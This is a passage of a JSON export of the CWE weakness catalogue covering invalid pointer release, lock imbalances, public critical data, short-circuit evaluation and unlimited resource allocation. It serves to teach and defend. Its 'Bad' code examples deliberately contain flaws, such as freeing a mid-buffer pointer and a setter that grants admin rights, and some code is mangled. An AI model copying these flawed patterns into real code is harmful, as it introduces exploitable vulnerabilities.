              "ExampleCode": "```\n\t#define SUCCESS (1)\n\t#define FAILURE (0)\n\tint contains_char(char c){\n\t\t\tchar *str;\n\t\t\tstr = (char*)malloc(20*sizeof(char));\n\t\t\tstrcpy(str, \"Search Me!\");\n\t\t\twhile( *str != NULL){\n\t\t\t\t\tif( *str == c ){\n```\n/* matched char, free string and return success */* \n\t\t\t\t\t\t\tfree(str);\n\t\t\t\t\t\t\treturn SUCCESS;}\n\t\t\t\t\t\n\t\t\t\t\t */* didn't match yet, increment pointer and try next char */* \n\t\t\t\t\t\n\t\t\t\t\tstr = str + 1;}\n\t\t\t\n\t\t\t */* we did not match the char in the string, free mem and return failure */* \n\t\t\t\n\t\t\tfree(str);\n\t\t\treturn FAILURE;}"
            },
            {
              "BodyText": "However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it."
            },
            {
              "BodyText": "Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t#define SUCCESS (1)\n\t#define FAILURE (0)\n\tint cointains_char(char c){\n\t\t\tchar *str;\n\t\t\tint i = 0;\n\t\t\tstr = (char*)malloc(20*sizeof(char));\n\t\t\tstrcpy(str, \"Search Me!\");\n\t\t\twhile( i < strlen(str) ){\n\t\t\t\t\tif( str[i] == c ){\n```\n/* matched char, free string and return success */* \n\t\t\t\t\t\t\tfree(str);\n\t\t\t\t\t\t\treturn SUCCESS;}\n\t\t\t\t\t\n\t\t\t\t\t */* didn't match yet, increment pointer and try next char */* \n\t\t\t\t\t\n\t\t\t\t\ti = i + 1;}\n\t\t\t\n\t\t\t */* we did not match the char in the string, free mem and return failure */* \n\t\t\t\n\t\t\tfree(str);\n\t\t\treturn FAILURE;}"
            }
          ]
        },
        {
          "ID": "DX-79",
          "Entries": [
            {
              "IntroText": "Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n```\n//hardcode input length for simplicity* \n\tchar* input = (char*) malloc(40*sizeof(char));\n\tchar *tok;\n\tchar* sep = \" \\t\";\n\t\n\tget_user_input( input );\n\t\n\t\n\t */* The following loop will parse and process each token in the input string */* \n\t\n\ttok = strtok( input, sep);\n\twhile( NULL != tok ){\n\t```\n\t\t\tif( isMalformed( tok ) ){\n```\n/* ignore and discard bad data */* \n\t\t\t\t\tfree( tok );}\n\t\t\telse{\n\t\t\t```\n\t\t\t\tadd_to_command_queue( tok );\n\t\t\t}\n\t\t\ttok = strtok( NULL, sep));\n\t}\n```"
            },
            {
              "BodyText": "While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together."
            },
            {
              "BodyText": "One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n```\n//hardcode input length for simplicity* \n\tchar* input = (char*) malloc(40*sizeof(char));\n\tchar *tok, *command;\n\tchar* sep = \" \\t\";\n\t\n\tget_user_input( input );\n\t\n\t\n\t */* The following loop will parse and process each token in the input string */* \n\t\n\ttok = strtok( input, sep);\n\twhile( NULL != tok ){\n\t```\n\t\t\tif( !isMalformed( command ) ){\n```\n/* copy and enqueue good data */* \n\t\t\t\t\tcommand = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );\n\t\t\t\t\tstrcpy( command, tok );\n\t\t\t\t\tadd_to_command_queue( command );}\n\t\t\ttok = strtok( NULL, sep));}\n\t\n\tfree( input )"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-11930",
          "Description": "function \"internally calls 'calloc' and returns a pointer at an index... inside the allocated buffer. This led to freeing invalid memory.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-11930"
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP12",
          "EntryName": "Faulty Memory Release"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-657",
          "Title": "boost C++ Library Smart Pointers",
          "URL": "https://www.boost.org/doc/libs/1_38_0/libs/smart_ptr/smart_ptr.htm",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-480",
          "Title": "Valgrind",
          "URL": "http://valgrind.org/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The view-1000 subtree that is associated with this weakness needs additional work. Several entries will likely be created in this branch. Currently the focus is on free() of memory, but delete and other related release routines may require the creation of intermediate entries that are not specific to a particular function. In addition, the role of other types of invalid pointers, such as an expired pointer, i.e. CWE-415 Double Free and release of uninitialized pointers, related to CWE-457."
        }
      ]
    },
    {
      "ID": "764",
      "Name": "Multiple Locks of a Critical Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product locks a critical resource more times than intended, leading to an unexpected state in the system.",
      "ExtendedDescription": "When a product is operating in a concurrent environment and repeatedly locks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra locking calls will reduce the size of the total available pool, possibly leading to degraded performance or a denial of service. If this can be triggered by an attacker, it will be similar to an unrestricted lock (CWE-412). In the context of a binary lock, it is likely that any duplicate locking attempts will never succeed since the lock is already held and progress may not be possible.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "667",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "675",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "662",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Crash, Exit, or Restart",
            "Unexpected State"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP21",
          "EntryName": "Multiple locks/unlocks"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "An alternate way to think about this weakness is as an imbalance between the number of locks / unlocks in the control flow. Over the course of execution, if each lock call is not followed by a subsequent call to unlock in a reasonable amount of time, then system performance may be degraded or at least operating at less than peak levels if there is competition for the locks. This entry may need to be modified to reflect these concepts in the future."
        }
      ]
    },
    {
      "ID": "765",
      "Name": "Multiple Unlocks of a Critical Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product unlocks a critical resource more times than intended, leading to an unexpected state in the system.",
      "ExtendedDescription": "When the product is operating in a concurrent environment and repeatedly unlocks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra calls to unlock will increase the count for the number of available resources, likely resulting in a crash or unpredictable behavior when the system nears capacity.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "667",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "675",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Modify Memory",
            "Unexpected State"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the product acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-0935",
          "Description": "Attacker provides invalid address to a memory-reading function, causing a mutex to be unlocked twice",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0935"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP21",
          "EntryName": "Multiple locks/unlocks"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "An alternate way to think about this weakness is as an imbalance between the number of locks / unlocks in the control flow. Over the course of execution, if each lock call is not followed by a subsequent call to unlock in a reasonable amount of time, then system performance may be degraded or at least operating at less than peak levels if there is competition for the locks. This entry may need to be modified to reflect these concepts in the future."
        }
      ]
    },
    {
      "ID": "766",
      "Name": "Critical Data Element Declared Public",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product declares a critical variable, field, or member to be public when intended security policy requires it to be private.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "732",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "1061",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ],
          "Note": "Making a critical variable public allows anyone with access to the object in which the variable is contained to alter or read the value."
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Data should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example declares a critical variable public, making it accessible to anyone with access to the object in which it is contained."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tpublic: char* password;\n```"
            },
            {
              "BodyText": "Instead, the critical data should be declared private."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tprivate: char* password;\n```"
            },
            {
              "BodyText": "Even though this example declares the password to be private, there are other possible issues with this implementation, such as the possibility of recovering the password from process memory (CWE-257)."
            }
          ]
        },
        {
          "ID": "DX-212",
          "Entries": [
            {
              "IntroText": "The following example shows a basic user account class that includes member variables for the username and password as well as a public constructor for the class and a public method to authorize access to the user account."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\t#define MAX_PASSWORD_LENGTH 15\n\t#define MAX_USERNAME_LENGTH 15\n\tclass UserAccount\n\t{\n\t\t\tpublic:\n\t\t\t\t\tUserAccount(char *username, char *password)\n\t\t\t\t\t{\n\t\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tstrcpy(this->username, username);\n\t\t\t\t\t\tstrcpy(this->password, password);\n\t\t\t\t\t}\n\t\t\tint authorizeAccess(char *username, char *password)\n\t\t\t{\n\t\t\t\t\tif ((strlen(username) > MAX_USERNAME_LENGTH) ||\n\t\t\t\t\t(strlen(password) > MAX_PASSWORD_LENGTH)) {\n\t\t\t\t\t\tExitError(\"Invalid username or password\");\n\t\t\t\t\t}\n```\n// if the username and password in the input parameters are equal to* \n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// the username and password of this account class then authorize access* \n\t\t\t\t\tif (strcmp(this->username, username) ||\n\t\t\t\t\tstrcmp(this->password, password))\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 0;\n```\n// otherwise do not authorize access* \n\t\t\t\t\telse\n\t\t\t\t\t```\n\t\t\t\t\t\treturn 1;\n\t\t\t}\n\t\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"
            },
            {
              "BodyText": "However, the member variables username and password are declared public and therefore will allow access and changes to the member variables to anyone with access to the object. These member variables should be declared private as shown below to prevent unauthorized access and changes."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tclass UserAccount\n\t{\n\tpublic:\n\t\t...\n\tprivate:\n\t\tchar username[MAX_USERNAME_LENGTH+1];\n\t\tchar password[MAX_PASSWORD_LENGTH+1];\n\t};\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-3860",
          "Description": "variables declared public allow remote read of system properties such as user name and home directory.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3860"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Failure to protect stored data from modification"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ01-J",
          "EntryName": "Declare data members as private and provide accessible wrapper methods"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        },
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-15"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-15",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "767",
      "Name": "Access to Critical Private Variable via Public Method",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product defines a public method that reads or modifies a private variable.",
      "ExtendedDescription": "If an attacker modifies the variable to contain unexpected values, this could violate assumptions from other parts of the code. Additionally, if an attacker can read the private variable, it may expose sensitive information or make it easier to launch further attacks.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use class accessor and mutator methods appropriately. Perform validation when accepting data from a public method that is intended to modify a critical private variable. Also be sure that appropriate access controls are being applied when a public method interfaces with critical data."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example declares a critical variable to be private, and then allows the variable to be modified by public methods."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tprivate: float price;\n\tpublic: void changePrice(float newPrice) {\n\t\tprice = newPrice;\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following example could be used to implement a user forum where a single user (UID) can switch between multiple profiles (PID)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Client {\n\t\tprivate int UID;\n\t\tpublic int PID;\n\t\tprivate String userName;\n\t\tpublic Client(String userName){\n\t\t\tPID = getDefaultProfileID();\n\t\t\tUID = mapUserNametoUID( userName );\n\t\t\tthis.userName = userName;\n\t\t}\n\t\tpublic void setPID(int ID) {\n\t\t\tUID = ID;\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The programmer implemented setPID with the intention of modifying the PID variable, but due to a typo. accidentally specified the critical variable UID instead. If the program allows profile IDs to be between 1 and 10, but a UID of 1 means the user is treated as an admin, then a user could gain administrative privileges as a result of this typo."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Failure to protect stored data from modification"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "OOP31-PL",
          "EntryName": "Do not access private variables or subroutines in other packages",
          "MappingFit": "Imprecise"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry is closely associated with access control for public methods. If the public methods are restricted with proper access controls, then the information in the private variable will not be exposed to unexpected parties. There may be chaining or composite relationships between improper access controls and this weakness."
        }
      ]
    },
    {
      "ID": "768",
      "Name": "Incorrect Short Circuit Evaluation",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product contains a conditional statement with multiple logical expressions in which one of the non-leading expressions may produce side effects. This may lead to an unexpected state in the program after the execution of the conditional, because short-circuiting logic may prevent the side effects from occurring.",
      "ExtendedDescription": "\n\nUsage of short circuit evaluation, though well-defined in the C standard, may alter control flow in a way that introduces logic errors that are difficult to detect, possibly causing errors later during the product's execution. If an attacker can discover such an inconsistency, it may be exploitable to gain arbitrary control over a system.\n\n\nIf the first condition of an \"or\" statement is assumed to be true under normal circumstances, or if the first condition of an \"and\" statement is assumed to be false, then any subsequent conditional may contain its own logic errors that are not detected during code review or testing.\n\n\nFinally, the usage of short circuit evaluation may decrease the maintainability of the code.\n",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Varies by Context"
          ],
          "Note": "Widely varied consequences are possible if an attacker is aware of an unexpected state in the product after a conditional. It may lead to information exposure, a system crash, or even complete attacker control of the system."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Minimizing the number of statements in a conditional that produce side effects will help to prevent the likelihood of short circuit evaluation to alter control flow in an unexpected way."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following function attempts to take a size value from a user and allocate an array of that size (we ignore bounds checking for simplicity). The function tries to initialize each spot with the value of its index, that is, A[len-1] = len - 1; A[len-2] = len - 2; ... A[1] = 1; A[0] = 0; However, since the programmer uses the prefix decrement operator, when the conditional is evaluated with i == 1, the decrement will result in a 0 value for the first part of the predicate, causing the second portion to be bypassed via short-circuit evaluation. This means we cannot be sure of what value will be in A[0] when we return the array to the user."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define PRIV_ADMIN 0\n\t#define PRIV_REGULAR 1\n\ttypedef struct{\n\t\tint privileges;\n\t\tint id;\n\t} user_t;\n\tuser_t *Add_Regular_Users(int num_users){\n\t\tuser_t* users = (user_t*)calloc(num_users, sizeof(user_t));\n\t\tint i = num_users;\n\t\twhile( --i && (users[i].privileges = PRIV_REGULAR) ){\n\t\t\tusers[i].id = i;\n\t\t}\n\t\treturn users;\n\t}\n\tint main(){\n\t\tuser_t* test;\n\t\tint i;\n\t\ttest = Add_Regular_Users(25);\n\t\tfor(i = 0; i < 25; i++) printf(\"user %d has privilege level %d\\n\", test[i].id, test[i].privileges);\n\t}\n```"
            },
            {
              "BodyText": "When compiled and run, the above code will output a privilege level of 1, or PRIV_REGULAR for every user but the user with id 0 since the prefix increment operator used in the if statement will reach zero and short circuit before setting the 0th user's privilege level. Since we used calloc, this privilege will be set to 0, or PRIV_ADMIN."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Failure to protect stored data from modification"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "769",
      "Name": "DEPRECATED: Uncontrolled File Descriptor Consumption",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Deprecated",
      "Description": "This entry has been deprecated because it was a duplicate of CWE-774. All content has been transferred to CWE-774.",
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This CWE has been deprecated.",
        "Comments": "See description and name for possible suggestions of other CWEs to consider.",
        "Reasons": [
          "Deprecated"
        ]
      }
    },
    {
      "ID": "770",
      "Name": "Allocation of Resources Without Limits or Throttling",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.",
      "ExtendedDescription": "\n\nCode frequently has to work with limited resources, so programmers must be careful to ensure that resources are not consumed too quickly, or too easily. Without use of quotas, resource limits, or other protection mechanisms, it can be easy for an attacker to consume many resources by rapidly making many requests, or causing larger resources to be used than is needed. When too many resources are allocated, or if a single resource is too large, then it can prevent the code from working correctly, possibly leading to a denial of service.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "400",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        },
        {
          "Phase": "System Configuration"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)",
            "DoS: Resource Consumption (Other)"
          ],
          "Note": "When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-8",
          "Method": "Manual Static Analysis",
          "Description": "Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all."
        },
        {
          "Method": "Fuzzing",
          "Description": "\n\nWhile fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted product in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.\n\n\nWhen the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.\n",
          "Effectiveness": "Opportunistic"
        },
        {
          "Method": "Automated Dynamic Analysis",
          "Description": "Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the product within a short time frame. Manual analysis is likely required to interpret the results."
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nSpecialized configuration or tuning may be required to train automated tools to recognize this weakness.\n\n\nAutomated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.\n\n\nAutomated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.\n"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold."
        },
        {
          "MitigationID": "MIT-5",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n",
          "EffectivenessNotes": "This will only be applicable to cases where user input can influence the size or frequency of resource allocations."
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
